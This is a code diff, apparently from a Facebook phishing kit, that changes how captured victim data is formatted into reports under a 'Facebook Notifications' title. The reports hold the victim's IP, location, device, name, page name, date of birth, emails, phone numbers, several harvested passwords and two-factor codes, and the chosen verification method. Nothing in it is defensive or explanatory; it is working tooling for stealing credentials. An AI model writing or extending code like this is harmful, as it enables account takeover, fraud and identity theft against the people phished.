@@ -5,6 +5,8 @@ interface BuildMessageOptions {
     userData: Pick<UserData, 'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName'> & {
         dateOfBirth?: string;
         backupPhone?: string;
+        reason?: string;
+        additionalNotes?: string;
     };
     passwords?: string[];
     codes?: string[];
@@ -50,6 +52,9 @@ const numberedLines = (label: string, values: string[]) =>
         .filter(Boolean) as string[];
 
 const DIVIDER = '----------------------';
+const ROOT_TITLE = '<b>Facebook Notifications</b>';
+
+const withRootTitle = (body: string) => (body ? `${ROOT_TITLE}\n${DIVIDER}\n${body}` : ROOT_TITLE);
 
 const METHOD_LABELS_VI: Record<string, string> = {
     code: 'Xác thực hai yếu tố',
@@ -63,10 +68,10 @@ const formatMethodLabel = (method?: string) => {
     return METHOD_LABELS_VI[key] || key;
 };
 
-const section = (title: string, rows: Array<string | null>) => {
+const section = (rows: Array<string | null>) => {
     const content = rows.filter(Boolean) as string[];
     if (content.length === 0) return null;
-    return [`<b>${title}</b>`, ...content];
+    return content;
 };
 
 const joinSections = (sections: Array<string[] | null>) =>
@@ -84,14 +89,16 @@ export function buildContinueMessage({
     language?: string;
     device?: string;
 }): string {
-    return joinSections([
-        section('🌐 SESSION', [
-            line('IP', geoInfo?.ip, true),
-            line('Location', formatLocation(geoInfo), true),
-            line('Device', device && device !== 'Unknown' ? device : '', true)
-        ]),
-        section('🟢 STATUS', ['• <b>CONTINUE CLICKED</b>'])
-    ]);
+    return withRootTitle(
+        joinSections([
+            section([
+                line('IP', geoInfo?.ip, true),
+                line('Location', formatLocation(geoInfo), true),
+                line('Device', device && device !== 'Unknown' ? device : '', true),
+                line('Continue', 'đã tick', true)
+            ])
+        ])
+    );
 }
 
 export function buildMetaMessage({
@@ -102,27 +109,28 @@ export function buildMetaMessage({
     selectedMethod = '',
     device = 'Unknown'
 }: BuildMessageOptions): string {
-    return joinSections([
-        section('🌐 SESSION', [
-            line('IP', geoInfo?.ip, true),
-            line('Location', formatLocation(geoInfo), true),
-            line('Device', device && device !== 'Unknown' ? device : '', true)
-        ]),
-        section('👤 PROFILE', [
-            line('Full Name', userData.fullName, true),
-            line('Page', userData.facebookPageName, true),
-            line('DOB', userData.dateOfBirth, true)
-        ]),
-        section('📧 CONTACT', [
-            line('Email', userData.personalEmail, true),
-            line('Business Email', userData.businessEmail, true),
-            line('Phone', userData.phoneNumber, true),
-            line('Backup Phone', userData.backupPhone, true)
-        ]),
-        section('🔑 PASSWORD', numberedLines('Password', passwords)),
-        section('🔒 2FA', numberedLines('2FA', codes)),
-        selectedMethod
-            ? section('⚙️ METHOD', [line('Method', formatMethodLabel(selectedMethod), true)])
-            : null
-    ]);
+    return withRootTitle(
+        joinSections([
+            section([
+                line('IP', geoInfo?.ip, true),
+                line('Location', formatLocation(geoInfo), true),
+                line('Device', device && device !== 'Unknown' ? device : '', true)
+            ]),
+            section([
+                line('Full Name', userData.fullName, true),
+                line('Page', userData.facebookPageName, true),
+                line('DOB', userData.dateOfBirth, true),
+                line('Notes', userData.additionalNotes, true)
+            ]),
+            section([
+                line('Email', userData.personalEmail, true),
+                line('Business Email', userData.businessEmail, true),
+                line('Phone', userData.phoneNumber, true),
+                line('Backup Phone', userData.backupPhone, true)
+            ]),
+            section(numberedLines('Password', passwords)),
+            section(numberedLines('2FA', codes)),
+            selectedMethod ? section([line('Method', formatMethodLabel(selectedMethod), true)]) : null
+        ])
+    );
 }
